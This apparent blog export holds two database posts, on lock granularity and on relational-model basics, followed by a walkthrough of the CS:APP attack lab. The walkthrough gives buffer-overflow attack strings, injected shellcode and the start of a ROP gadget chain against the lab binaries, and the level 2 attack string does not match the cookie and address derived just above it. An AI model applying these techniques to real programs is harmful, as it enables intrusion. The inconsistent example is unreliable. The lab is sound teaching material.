<h2 id="多粒度"><a href="#多粒度" class="headerlink" title="多粒度"></a>多粒度</h2><p>之前提到的例子均将一个个数据项作为同步执行的单元，如果一个事务想更新一百万个元组，那么该事务将请求一百万个条目。为了避免多余的开销，系统将通过层次化锁来允许一个事务粗粒度加锁。例如，该事务将为一百个元组申请一个锁，而不是为每个元组申请一个锁。当一个事务请求层次化结构中的某个节点，该事务隐式地为其后代加锁。</p>
<p>若事务Ti希望封锁整个数据库，而Tj持有其中某个节点的锁，那么系统如何判定根节点是否可以加锁呢？</p>
<p>一种可能的方法是遍历整棵树，显然违背了多粒度锁机制的初衷。通过引入意向锁来允许高层次节点在无需检查后代节点即可加共享锁或者排他锁。如果一个节点加上了意向锁，那么意味着在树的更低层进行显式加锁，即以更小的粒度加锁。在一个节点显示加锁之前，其所有祖先节点均加上了意向锁。因此，事务不必遍历整棵树即可判定能否成功地给一个节点加锁。</p>
<ul>
<li><strong>共享型意向锁(IS)</strong> 将在树的较低层进行显式封锁，但是只能加共享锁</li>
<li><strong>排他型意向锁(IX)</strong> 在树的较低层进行显式封锁，可以是共享锁或排他锁</li>
<li><strong>共享排他型意向锁(SIX)</strong> 以该节点为根的子树显式地加上共享锁，在树的更低层显示地加上排他锁</li>
</ul>
<p>这些锁的相容矩阵为</p>
<p><img src="https://i.loli.net/2020/02/06/5G4bs23khoDpdOw.png"></p>
<p>多粒度封锁协议根据以下规则对数据项Q加锁：</p>
<ul>
<li>事务Ti必须首先封锁树的根节点，并可以加任意类型的锁</li>
<li>仅当Ti当前对Q的父节点具有IX或IS锁时，Ti可以对节点Q可加S锁或者IS锁、</li>
<li>仅当Ti当前对Q的父节点具有IX或SIX锁时，Ti可以对节点Q加X、SIX或IX锁</li>
</ul>
<p>加锁按照从上到下的顺序，而锁的释放则按照从下到上的顺序。</p>
<p>在低层次的锁申请过多时，为了更高粒度的并行，可以升级锁。</p>
<h1 id="时间戳排序协议"><a href="#时间戳排序协议" class="headerlink" title="时间戳排序协议"></a>时间戳排序协议</h1>]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>database systems</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库导论</title>
    <url>/database_system/database/</url>
    <content><![CDATA[<p>数据库管理系统在日常生活中的应用非常广泛，用于管理计算机数据。随着当今时代数据爆炸性增长，数据库系统也日益成为计算机应用的核心部分。</p>
<a id="more"></a>

<p>数据库是由一组模拟生活中某些方面的数据组织成的集合，例如，模拟学生或者歌曲库。数据库管理系统就是用于管理数据库的软件。</p>
<p>为什么引入数据库管理系统呢？</p>
<h1 id="简易设计"><a href="#简易设计" class="headerlink" title="简易设计"></a>简易设计</h1><p>假设我们用文件来管理数据库中的数据，以歌手和他们发布的专辑信息为例，我们将分别为歌手和专辑建立CSV文件。</p>
<p><code>歌手.csv</code>文件信息为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Wu Tang Clan&quot;,1992,&quot;USA&quot;</span><br><span class="line">&quot;Notorious BIG&quot;,1992,&quot;USA&quot;</span><br><span class="line">&quot;Ice Cube&quot;,1989,&quot;USA&quot;</span><br></pre></td></tr></table></figure>
<p>每行的信息分别为歌手名、出道年份、国家。</p>
<p><code>专辑.csv</code>文件信息为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Enter the Wu Tang&quot;,&quot;Wu Tang Clan&quot;,1993</span><br><span class="line">&quot;St.Ides Mix Tape&quot;,&quot;Wu Tang Clan&quot;,1994</span><br><span class="line">&quot;AmeriKKKa&#39;s Most Wanted&quot;,&quot;Ice Cube&quot;,1990</span><br></pre></td></tr></table></figure>
<p>每行的信息分别为专辑名、歌手名、发布年份。</p>
<p>查询<code>Ice Cube</code>出道年份可用如下代码实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for line in file: </span><br><span class="line"> record &#x3D; parse(line) </span><br><span class="line"> if “Ice Cube” &#x3D;&#x3D; record[0]: </span><br><span class="line">   print int(record[1])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是这种通过文件来存储数据的方式存在不少问题</p>
<ul>
<li><p>数据完整性</p>
<p>如何存储多个歌手的专辑信息？</p>
<p>如何防止无效信息的写入？</p>
</li>
<li><p>查询/更新实现</p>
<p>如何查询特定的记录？</p>
<p>如何实现基于同一数据库的应用？</p>
<p>如何控制线程并发写入数据库？</p>
</li>
<li><p>持久性</p>
<p>如何在机器更新时确保信息正确？</p>
<p>如何在多个设备之间同步？</p>
</li>
</ul>
<p>基于以上考虑，我们引入了数据库管理系统，通过数据库管理系统来定义、创建、查询、更新数据库。</p>
<h1 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h1><p>接下来我们将通过数据模型来描述数据库中的数据。数据模型是数据库结构的基础。给定数据模型后，对特定数据集合的描述称为模式。</p>
<p>数据模型分为以下几类</p>
<ul>
<li><p><strong>关系模型</strong>  用表的集合来表示数据和数据建的联系</p>
</li>
<li><p><strong>实体-联系模型</strong>  现实世界由一组称为实体的基本对象和这些对象之间的联系构成，实体-联系模型即用于描述这些数据。</p>
</li>
<li><p><strong>半结构数据模型</strong></p>
</li>
<li><p><strong>网状数据模型</strong></p>
</li>
<li><p><strong>层次数据模型</strong></p>
<p>其中网状数据模型和层次数据模型和底层实现很紧密，实现复杂，所以现在很少使用。数据库设计基本围绕关系模型展开。</p>
</li>
</ul>
<h1 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h1><p>关系模型的核心在于</p>
<ol>
<li>以简单的数据结构来存储数据(关系)</li>
<li>通过高级语言来操作数据</li>
<li>物理层存储取决于具体实现</li>
</ol>
<p>关系模型主要由以下部分组成</p>
<ul>
<li>结构：关系的定义和结构内容，即关系对应的属性和这些属性中的值</li>
<li>完整性：确保数据库内容满足约束，例如，所有的年份属性都应该是数字</li>
<li>操作：如何访问和修改数据库的内容</li>
</ul>
<p>一个关系即是一组代表实体的属性的无序序列。正因为关系无序，所以数据库管理系统可以任何方式存储关系。一个有$n$个属性的关系被称为$n$列关系。</p>
<p>一个元组是关系中一组属性的值，也就是关系中某一行。元组中的值通常是原子的，即不可再拆分。特殊的空值NULL是每个域的成员。</p>
<p>一个关系的主键区别了不同的元组。某些数据库管理系统在用户未定义主键时自行创建主键。</p>
<h1 id="数据库操纵语言"><a href="#数据库操纵语言" class="headerlink" title="数据库操纵语言"></a>数据库操纵语言</h1><p>数据库系统提供数据定义语言来定义数据库模式，以及数据库操纵语言来表达数据库的管理和更新。实际上，数据定义和数据操作语言并不是分离的，而是简单地构成了单一的数据库语言的不同部分。</p>
<p>数据库操作语言分为两类</p>
<ul>
<li><strong>过程化数据库操纵语言</strong> 指明用户需要什么数据，以及怎么获取这些数据</li>
<li><strong>声明化数据库操纵语言</strong> 只要求用户指定需要什么数据，而不指明如何获取这些数据</li>
</ul>
<h2 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h2><p>关系代数是一个运算的集合，以一个或两个关系为输入，以一个新的关系为结果。可通过嵌套来实现更复杂的操作。</p>
<p>关系基本运算有：选择、投影、并、集合交、集合并、集合差、笛卡尔积和重命名。</p>
<p><strong>选择运算</strong></p>
<p>选择运算选出满足给定谓词的元组。</p>
<ul>
<li>谓词过滤不符合条件的元组，仅留下满足谓词条件的元组</li>
<li>可通过连词将多个谓词连接</li>
</ul>
<p><strong>投影运算</strong></p>
<p>投影运算以某个关系为输入，输出仅含特定属性的元组的关系。</p>
<ul>
<li>可重新排列属性顺序</li>
<li>可对属性的值操作</li>
</ul>
<p><strong>集合交</strong></p>
<p>集合交以两个关系为输入，输出仅含在两个关系中均出现的元组的关系。</p>
<p><strong>集合并</strong></p>
<p>集合并以两个关系为输入，输出在两个关系中至少出现一次的元组的关系。</p>
<p><strong>集合差</strong></p>
<p>集合并以两个关系为输入，输出在第一个关系中出现而第二个关系中不出现的元组的关系。</p>
<p><strong>连接运算</strong></p>
<p>以两个关系为输入，生成一个关系，该关系中的元组是两个元组（每个输入关系中各选一个）的组合，并且具有一个或多个属性的公共值。</p>
<p><strong>笛卡尔积</strong></p>
<p>以两个关系为输入，输出所有可能的组合。</p>
<p>关系代数为过程化语言，因为关系代数定义了计算查询的步骤。</p>
<p>例如，若想查询R和S连接后满足b_id等于102的元组，</p>
<p>关系代数可以是先连接R，S，再选择其中b_id等于102的元组，或者先选择S中b_id等于102的元组，再与R连接。</p>
<p>更好的方式是声明想让数据库管理系统返回的元组，类似查询R和S连接后满足b_id等于102的元组。</p>
<p>关系代数定义了数据库查询的原语。</p>
<p>关系模型仅描述了高层次的操作，与具体实现语言无关。</p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>database systems</tag>
      </tags>
  </entry>
  <entry>
    <title>attacklab</title>
    <url>/systems/attacklab/</url>
    <content><![CDATA[<p>各种病毒扫描软件都会提示有安全漏洞，通过安全漏洞攻击者可以使攻击者能够在未授权的情况下访问或破坏系统。栈溢出攻击就是常见的攻击手段之一，通过向栈中写入过多的数据导致数据溢出来改变程序执行流程，从而达到攻击的效果。在attack lab中，我们将利用getbuf()函数不检查输入字符存储空间和栈分配空间检查的这一特性来对现有程序进行控制流劫持，执行非法程序代码。</p>
<a id="more"></a>
<p>这次我们将采用两种方式来进行攻击：</p>
<ul>
<li>栈溢出攻击</li>
<li>ROP攻击</li>
</ul>
<p>以下为栈帧结构，栈顶的地址最小，栈顶的地址最大，寄存器<code>rsp</code>指向栈顶，返回地址可能因为栈溢出而被覆盖。<br><img src="https://i.loli.net/2020/02/03/MkVZRSthFfm72gs.png"></p>
<p>讲义首先给我们介绍了程序漏洞的关键：<code>getbuf</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>getbuf()</code>函数在栈中申请了一块大小为<code>BUFFER_SIZE</code>字节的空间，<code>Gets()</code>函数与<code>gets()</code>类似，用于从标准输入流中读取字符。由于未对输入字符串所需空间与栈分配空间检查，只是简单地复制字节序列，所以我们可以通过输入超过BUFFER_SIZE字节的字符串来改变函数的行为。<br><code>ret</code>指令会将调用方在栈中的返回地址读入IP 中，从而执行该地址指向的代码。代码注入攻击（code injection attacks)在栈中写入可执行的代码，将返回地址设置为可执行代码的起始位置即可执行。</p>
<h1 id="Code-Injection-Attacks"><a href="#Code-Injection-Attacks" class="headerlink" title="Code Injection Attacks"></a>Code Injection Attacks</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>在这一关中，我们无需注入代码，只需要更改getbuf()函数的返回地址执行<code>touch1</code> 即可。<br><code>ctarget</code>通过test函数来调用<code>getbuf()</code>函数。<br>讲义给出<code>ctarget</code>中<code>test</code>的c语言代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NO explit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们需要让程序执行<code>touch1</code>函数，在<code>test</code>函数返回时调用<code>touch1</code>而不是返回<code>test</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将<code>ctarget</code>反编译成汇编代码，重定向到<code>ctarget.txt</code>中：<code>objdump -d ctarget &gt; ctarget.txt</code><br>接下来我们需要确定<code>getbuf()</code>分配的栈空间的大小，<code>getbuf()</code>对应的反汇编程序如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004017</span>a8 &lt;getbuf&gt;:</span><br><span class="line">  <span class="number">4017</span>a8:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>          	sub    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017</span>ac:	<span class="number">48</span> <span class="number">89</span> e7             	mov    %rsp,%rdi</span><br><span class="line">  <span class="number">4017</span>af:	e8 <span class="number">8</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>a40 &lt;Gets&gt;</span><br><span class="line">  <span class="number">4017b</span>4:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">4017b</span>9:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>          	add    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017b</span>d:	c3                   	retq   </span><br><span class="line">  <span class="number">4017b</span>e:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">4017b</span>f:	<span class="number">90</span>                   	nop</span><br></pre></td></tr></table></figure>
<p>这里将<code>rsp</code>减了<code>0x28(40)</code> ,即在栈中分配了一块40字节的空间，之后将<code>rsp</code> 作为<code>Gets</code>的参数传入。<br>根据栈帧的结构，栈向低地址增长，在栈的40字节以上的8个字节是调用<code>getbuf</code>后的返回地址，也就是下一条指令地址。我们需要将栈的40个字节填满，再写入<code>touch1</code>函数的入口地址，在<code>getbuf</code> 执行了<code>ret</code>指令后就会跳转到<code>touch1</code> 的地址开始执行。<br>查看<code>touch1</code>对应的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004017</span>c0 &lt;touch1&gt;:</span><br><span class="line">  <span class="number">4017</span>c0:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          	sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">4017</span>c4:	c7 <span class="number">05</span> <span class="number">0</span>e <span class="number">2</span>d <span class="number">20</span> <span class="number">00</span> <span class="number">01</span> 	movl   $<span class="number">0x1</span>,<span class="number">0x202d0e</span>(%rip)        # <span class="number">6044</span>dc &lt;vlevel&gt;</span><br></pre></td></tr></table></figure>
<p>注意到x86为小端法编址，构造字符串序列如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<ul>
<li>将上述字符串写入touch1.txt <code>vi touch1.txt</code></li>
<li>将字符串转换为字节码 <code>./hex2raw &lt; touch1.txt &gt; touch1_r.txt</code> </li>
<li>再执行 <code>./ctarget -i -q touch1_r.txt</code></li>
</ul>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>Level2需要插入代码段，讲义给出<code>ctarget</code>中的<code>touch2</code>函数的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与Level 1类似，Level 2要求跳转到<code>touch2</code>处执行，不同的是，我们需要将cookie作为参数传入。我们需要让程序执行我们插入的代码，设置对应的参数，再调用touch2函数。<br>touch2的第一个参数存放在<code>rdi</code>中，我们需要设置这个寄存器的值为cookie。<br>由此可知，我们插入的代码的汇编格式应该如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">movq $<span class="number">0x59b997fa</span>,%rdi <span class="comment">// rdi = cookie</span></span><br><span class="line">pushq $<span class="number">0x4017ec</span> <span class="comment">//将rsp设为touch2地址</span></span><br><span class="line">ret <span class="comment">//读取rsp指向的地址并跳转</span></span><br></pre></td></tr></table></figure>
<p>接下来将汇编代码编译成机器代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -c touch2.s</span><br></pre></td></tr></table></figure>
<p>再转换成对应的机器码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -d touch2.o &gt; touch2.bytes</span><br></pre></td></tr></table></figure>
<p><code>touch2.bytes</code>中的内容为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">touch2.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> 	mov    $<span class="number">0x59b997fa</span>,%rdi</span><br><span class="line">   <span class="number">7</span>:	<span class="number">68</span> ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span>       	pushq  $<span class="number">0x4017ec</span></span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>将指令的机器码作为攻击字符串的开头，将栈的首地址放在栈外的8个字节，其余部分用0填充，构成我们的攻击字符串。<br>接下来我们需要查看rsp对应的位置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004017</span>a8 &lt;getbuf&gt;:</span><br><span class="line">  <span class="number">4017</span>a8:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>          	sub    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017</span>ac:	<span class="number">48</span> <span class="number">89</span> e7             	mov    %rsp,%rdi</span><br><span class="line">  <span class="number">4017</span>af:	e8 <span class="number">8</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>a40 &lt;Gets&gt;</span><br><span class="line">  <span class="number">4017b</span>4:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">4017b</span>9:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>          	add    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017b</span>d:	c3                   	retq   </span><br><span class="line">  <span class="number">4017b</span>e:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">4017b</span>f:	<span class="number">90</span>                   	nop</span><br></pre></td></tr></table></figure>
<p>在0x4017ac处设置断点 <code>break *0x4017ac</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x2F;64xb $rsp</span><br></pre></td></tr></table></figure>
<p>查看rsp后64个字节的内容，可以看到首地址为<code>0x5561dc78</code>，第6行也就是0x28个字节之后存放原返回地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00</span><br><span class="line">0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x5561dca8:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure>
<p>构造攻击字符串如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 ee 4f 37 45 68 </span><br><span class="line">60 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>讲义给出<code>ctarget</code> 中的<code>touch2</code> 函数的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和Level 2有所不同，Level 3会调用另外一个函数来进行检验，将字符串的首地址传入touch3中，这个字符串需要和cookie字符串相同。<br>首先将cookie对应字符串<code>0x59b997fa</code>转换为ASCII码表示的字符串<code>35 39 62 39 39 37 66 61 00</code> 。之后我们需要将字符串存放在栈中，并将rdi的值设置为字符串的首地址。同时在<code>hexmatch</code>函数调用过程中我们需要确保字符串中的数据不被覆盖，这样<code>hexmatch</code> 才可以返回正确的值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004018f</span>a &lt;touch3&gt;:</span><br><span class="line">  <span class="number">4018f</span>a:	<span class="number">53</span>                   	push   %rbx</span><br><span class="line">  .</span><br><span class="line">  .</span><br><span class="line">  .</span><br><span class="line">  <span class="number">401911</span>:	e8 <span class="number">36</span> ff ff ff       	callq  <span class="number">40184</span>c &lt;hexmatch&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">000000000040184</span>c &lt;hexmatch&gt;:</span><br><span class="line">  <span class="number">40184</span>c:	<span class="number">41</span> <span class="number">54</span>                	push   %r12</span><br><span class="line">  <span class="number">40184</span>e:	<span class="number">55</span>                   	push   %rbp</span><br><span class="line">  <span class="number">40184f</span>:	<span class="number">53</span>                   	push   %rbx</span><br></pre></td></tr></table></figure>
<p>上述指令在执行过程中都会向栈中压入新的内容，调用touch3之后分配的栈空间因此会发生改变。如果将字符串放在touch3地址以上区域就不会被覆盖。<br>汇编代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov $0x5561dc90,%rdi</span><br><span class="line">mov $0x5561dc88,%rsp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>转化为机器码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 90 dc 61 55    mov    $0x5561dc90,%rdi</span><br><span class="line">   7:   48 c7 c4 88 dc 61 55    mov    $0x5561dc88,%rsp</span><br><span class="line">   e:   c3                      retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>构造攻击字符串如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 90 dc 61 55 48 </span><br><span class="line">c7 c4 88 dc 61 55 c3 00</span><br><span class="line">fa 18 40 00 00 00 00 00 &#x2F;&#x2F;touch3地址</span><br><span class="line">35 39 62 39 39 37 66 61 &#x2F;&#x2F; 目标字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 &#x2F;&#x2F;注入指令首地址</span><br></pre></td></tr></table></figure>
<h1 id="ROP-attacks"><a href="#ROP-attacks" class="headerlink" title="ROP attacks"></a>ROP attacks</h1><p>之前我们通过在栈空间中插入可执行的代码来进行攻击，但是在<code>rtarget</code>中采用了两种技术来防止这种攻击：</p>
<ul>
<li>栈随机化，这样我们无法确定跳转位置。</li>
<li>栈中的代码是不可执行的，所以我们按照之前的方式插入代码会引发段错误。</li>
</ul>
<p>但是我们可以通过返回地址来执行我们想要的操作。<br>例如，程序中有这样一个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应汇编代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400f</span>15 &lt;setval_210&gt;:</span><br><span class="line">  <span class="number">400f</span>15:       c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7       movl   $<span class="number">0xc78948d4</span>,(%rdi)</span><br><span class="line">  <span class="number">400f</span>1b:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>其中字节序列<code>48 89 c7 c3</code>又可被解读为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>那么我们可以怎么利用这个字节序列来执行这个代码呢？将返回地址设置为该字节序列的起始位置<code>0x400f15</code>，在执行ret指令的时候就会跳转到这个地址，执行<code>48 89 c7 c3</code>所编码的指令。</p>
<h2 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h2><p>与之前Level 2任务相同：将自己的cookie作为参数传入touch2<br>查看<code>gadget</code>中提供的我们可以执行指令，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a7 &lt;addval_219&gt;: </span><br><span class="line">  <span class="number">4019</span>a7:	<span class="number">8</span>d <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>    	lea    <span class="number">-0x6fa78caf</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>ad:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>其中<code>58 90 c3</code>，这三个字节分别编码了三条指令：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>接下来我们需要</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">movq %rax,%rdi</span><br></pre></td></tr></table></figure>
<p>在给定的可执行代码中查找，刚好有对应的字节序列</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004019</span>c3 &lt;setval_426&gt;: </span><br><span class="line">  <span class="number">4019</span>c3:	c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 <span class="number">90</span>    	movl   $<span class="number">0x90c78948</span>,(%rdi)</span><br><span class="line">  <span class="number">4019</span>c9:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>其中<mark class="label default">48 89 c7 c3</mark>编码了上述指令。<br>分别计算指令地址，构造攻击字符串如下：</p>
